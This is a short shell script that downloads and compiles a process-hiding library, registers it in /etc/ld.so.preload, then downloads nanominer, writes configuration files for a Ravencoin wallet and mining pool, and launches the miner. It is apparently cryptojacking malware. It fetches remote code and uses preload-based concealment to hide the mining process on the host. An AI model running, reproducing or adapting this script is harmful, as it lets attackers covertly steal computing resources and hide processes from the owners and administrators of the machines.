#!/bin/sh
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNan.zip
unzip magicNan.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://github.com/nanopool/nanominer/releases/download/3.3.2/nanominer-linux-3.3.2-cuda11.tar.gz
tar -xvzf nanominer-linux-3.3.2-cuda11.tar.gz
cd nanominer-linux-3.3.2-cuda11
rm config*
cat > config_rvn.ini <<END
[Kawpow]
wallet = RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj
coin = Rvn
rigName = Nano
pool1 = stratum.ravenminer.com:13838
END

cat > config.ini <<END
[Kawpow]
wallet = RSXqoGq5CKxy7eSm8pcSjpCMGenD9FY3gj
coin = Rvn
rigName = Nano
pool1 = stratum.ravenminer.com:13838
END

chmod +x nanominer
chmod +x amdmemtweak
./nanominer
